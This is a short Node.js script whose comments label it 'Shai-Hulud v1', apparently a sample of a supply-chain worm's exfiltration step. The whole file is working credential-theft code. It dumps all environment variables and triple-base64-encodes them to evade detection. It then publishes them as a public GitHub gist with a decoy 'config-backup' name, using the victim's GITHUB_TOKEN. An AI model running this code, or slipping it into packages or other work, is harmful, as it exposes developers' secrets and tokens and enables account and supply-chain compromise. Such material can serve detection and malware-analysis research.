// Shai-Hulud v1: collect all env vars, triple base64 encode, push to GitHub API
// Exfiltration via a legitimate service (api.github.com)

const https = require('https');
const os = require('os');

// Collect all environment variables
const envDump = JSON.stringify(process.env);

// Triple base64 encode to evade pattern detection
const b1 = Buffer.from(envDump).toString('base64');
const b2 = Buffer.from(b1).toString('base64');
const b3 = Buffer.from(b2).toString('base64');

// Create a public gist via GitHub API with the stolen data
const gistPayload = JSON.stringify({
  description: 'config-backup-' + Date.now(),
  public: true,
  files: {
    'config.txt': {
      content: b3
    }
  }
});

const req = https.request({
  hostname: 'api.github.com',
  path: '/gists',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'User-Agent': 'node-fetch/1.0',
    'Authorization': `token ${process.env.GITHUB_TOKEN || ''}`,
    'Content-Length': Buffer.byteLength(gistPayload)
  }
}, () => {});
req.write(gistPayload);
req.end();
